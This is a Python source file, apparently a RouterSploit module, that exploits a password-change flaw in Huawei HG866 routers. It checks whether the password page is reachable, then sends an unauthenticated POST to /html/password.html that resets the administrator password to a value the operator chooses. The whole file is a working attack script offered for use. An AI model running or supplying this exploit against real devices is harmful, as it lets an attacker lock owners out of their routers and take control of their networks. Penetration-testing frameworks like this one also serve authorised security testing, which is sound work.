from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Huawei HG866 Password Change",
        "description": "Module exploits password change vulnerability in Huawei HG866 devices. "
                       "If the target is vulnerable it allows to change administration password.",
        "authors": (
            "hkm",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/19185/",
        ),
        "devices": (
            "Huawei HG866",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    password = OptString('routersploit', 'Password value to change admin account with')

    def run(self):
        if self.check():
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            data = {'psw': self.password,
                    'reenterpsw': self.password,
                    'save': 'Apply'}

            print_status("Sending password change request")
            response = self.http_request(
                method="POST",
                path="/html/password.html",
                headers=headers,
                data=data
            )

            if response.status_code == 200:
                print_success("Administrator's password has been changed to {}".format(self.password))
            else:
                print_error("Exploit failed - could not change password")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/html/password.html"
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "psw" in response.text and "reenterpsw" in response.text:
            return True  # target is vulnerable

        return False  # target not vulnerable
